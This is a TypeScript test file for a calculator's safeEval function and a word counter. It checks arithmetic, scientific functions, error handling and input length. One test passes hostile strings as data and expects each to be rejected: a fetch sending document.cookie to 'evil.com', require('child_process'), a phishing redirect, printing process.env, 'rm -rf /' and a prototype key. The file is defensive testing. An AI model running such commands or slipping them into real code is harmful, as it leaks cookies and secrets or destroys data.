import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { safeEval, countWords } from './calc.ts';

describe('safeEval (no eval/Function, CVE-2026-12866 pattern banned)', () => {
  it('basic arithmetic + precedence', () => {
    assert.equal(safeEval('2+3*4'), '14');
    assert.equal(safeEval('(2+3)*4'), '20');
    assert.equal(safeEval('10/4'), '2.5');
  });
  it('scientific functions + constants', () => {
    assert.equal(safeEval('sqrt(9)'), '3');
    assert.equal(safeEval('2^3'), '8');
    assert.equal(safeEval('5!'), '120');
    assert.equal(safeEval('sin(0)'), '0');
    assert.equal(safeEval('log(100)'), '2');
    assert.equal(safeEval('ln(e)'), '1');
  });
  it('division by zero + bad math -> Error, never Infinity/throw', () => {
    assert.equal(safeEval('1/0'), 'Error');
    assert.equal(safeEval('sqrt(-1)'), 'Error');
    assert.equal(safeEval('log(0)'), 'Error');
    assert.equal(safeEval(''), '');
  });
  it('injection blocked (alert/fetch/require/window/process)', () => {
    for (const evil of [
      "alert('xss')",
      "fetch('https://evil.com/'+document.cookie)",
      "require('child_process')",
      "window.location='https://phishing.com'",
      "console.log(process.env)",
      "2+2; rm -rf /",
      "__proto__",
    ]) {
      assert.equal(safeEval(evil), 'Error', evil);
    }
  });
  it('length cap + float hygiene (0.1+0.2)', () => {
    assert.equal(safeEval('x'.repeat(101)), 'Error');
    assert.equal(safeEval('0.1+0.2'), '0.3');
  });
});

describe('countWords', () => {
  it('counts + empty', () => {
    assert.equal(countWords('  hello   world '), 2);
    assert.equal(countWords('   '), 0);
  });
});
